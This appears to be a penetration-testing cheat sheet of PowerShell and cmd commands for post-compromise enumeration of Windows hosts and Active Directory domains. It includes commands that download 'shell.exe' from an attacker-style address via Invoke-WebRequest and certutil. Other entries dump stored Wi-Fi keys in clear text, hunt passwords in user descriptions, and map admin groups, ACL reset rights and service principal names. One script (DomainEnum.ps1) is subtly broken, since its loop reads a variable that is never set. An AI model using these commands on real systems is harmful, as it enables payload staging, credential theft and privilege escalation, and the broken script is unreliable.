Powershell Commands
System enumeration
systeminfo
Get-WmiObject Win32_ComputerSystem
echo "$env:COMPUTERNAME.$env:USERDNSDOMAIN"
List Security patches
Get-Hotfix -description "Security update"
wmic qfe get HotfixID,ServicePackInEffect,InstallDate,InstalledBy,InstalledOn
Environment Variables
Get-ChildItem Env: | ft Key,Value
(over cmd.exe)
set
HTTP download (wget like)
Invoke-WebRequest "http://10.10.10.10/shell.exe" -OutFile "shell.exe" 
Cmd compatible
certutil -urlcache -f http://10.10.10.10/shell.exe shell.exe
WLAN enumeration
netsh wlan show profiles
netsh wlan show profile name="PROFILE-NAME" key=clear
Active Directory enumeration
Require Powerview.ps1
https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1
Domain enumeration
Get-NetDomain
List Forest Domains
Get-NetForestDomain
Domain SID
Get-DomainSID 
Domain Policy
Get-DomainPolicy
Domain Organizational Units
Get-NetOU
List trusted Domains
Get-NetDomainTrust
GPO enumeration
GPO applied to the machine
Get-NetGPO -ComputerName computername.domain.com
Password enumeration
Last Password Set date
Get-UserProperty -Properties pwdlastset
Description of User object
Find-UserField -SearchField Description -SearchTerm “pass”
Computer enumeration
List Computers of the Domain
Get-NetComputer
List Pingable Hosts
Get-NetComputer -Ping
List Windows 7 Ultimate Computers
Get-NetComputer -OperatingSystem "Windows 7 Ultimate"
Admin groups and account enumeration
List Domain Admin members
Get-NetGroupMember -GroupName "Domain Admins"
List Admin Groups
Get-NetGroup *admin*
List Local Admins [need Administrative rights]
Get-NetLocalGroup -ComputerName PCNAME-001
Get groups of user [need Administrative rights]
Get-NetGroup -UserName "username"
ACL enumeration
User ACL
Get-ObjectAcl -SamAccountName "users" -ResolveGUIDs
GPO modifications rights
Get-NetGPO | %{Get-ObjectAcl -ResolveGUIDs -Name $_.Name}
Password reset rights
Get-ObjectAcl -SamAccountName labuser -ResolveGUIDs -RightsFilter "ResetPassword"
Local reconnaissance
Export user accounts with ldifde
ldifde -d "OU=THING,DC=CHANGE,DC=ME" -p subtree -f dump.ldf
Export user accounts with csvde
csvde -d "OU=THING,DC=CHANGE,DC=ME" -p subtree -f dump.csv
Active Directory scripts
Enumerate Domain Users (DomainEnum.ps1)
$domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
$PDC = ($domainObj.PdcRoleOwner).Name
$SearchString = "LDAP://"
$SearchString += $PDC + "/"
$DistinguishedName = "DC=$($domainObj.Name.Replace('.', ',DC='))"
$SearchString += $DistinguishedName
$Searcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]$SearchString)
$objDomain = New-Object System.DirectoryServices.DirectoryEntry
$Searcher.SearchRoot = $objDomain
$Searcher.filter="samAccountType=805306368"

# To search for specific user, uncomment below
# $Searcher.filter="name=[user_name]"

$Searcher.FindAll()
Foreach($obj in $Result)
{
 Foreach($prop in $obj.Properties)
 {
 $prop
 }
 Write-Host "------------------------"
}
Enumerate Domain Groups (Domaingp.ps1)
$domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
$PDC = ($domainObj.PdcRoleOwner).Name
$SearchString = "LDAP://"
$SearchString += $PDC + "/"
$DistinguishedName = "DC=$($domainObj.Name.Replace('.', ',DC='))"
$SearchString += $DistinguishedName
$Searcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]$SearchString)
$objDomain = New-Object System.DirectoryServices.DirectoryEntry
$Searcher.SearchRoot = $objDomain
$Searcher.filter="(objectClass=Group)"
$Result = $Searcher.FindAll()
Foreach($obj in $Result)
{
 $obj.Properties.name
}
Enumerate Members of a Group (EnumMembers.ps1)
$domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
$PDC = ($domainObj.PdcRoleOwner).Name
$SearchString = "LDAP://"
$SearchString += $PDC + "/"
$DistinguishedName = "DC=$($domainObj.Name.Replace('.', ',DC='))"
$SearchString += $DistinguishedName
$Searcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]$SearchString)
$objDomain = New-Object System.DirectoryServices.DirectoryEntry
$Searcher.SearchRoot = $objDomain

# change "Secret_Group" to correct group name
$Searcher.filter="(name=Secret_Group)"
$Result = $Searcher.FindAll()
Foreach($obj in $Result)
{
 $obj.Properties.member
}
Detect Service Principal Names (SpnEnum.ps1)
$domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
$PDC = ($domainObj.PdcRoleOwner).Name
$SearchString = "LDAP://"
$SearchString += $PDC + "/"
$DistinguishedName = "DC=$($domainObj.Name.Replace('.', ',DC='))"
$SearchString += $DistinguishedName
$Searcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]$SearchString)
$objDomain = New-Object System.DirectoryServices.DirectoryEntry
$Searcher.SearchRoot = $objDomain
$Searcher.filter="serviceprincipalname=*http*" # change name as needed
$Result = $Searcher.FindAll()
Foreach($obj in $Result)
{
 Foreach($prop in $obj.Properties)
 {
 $prop
 }
}
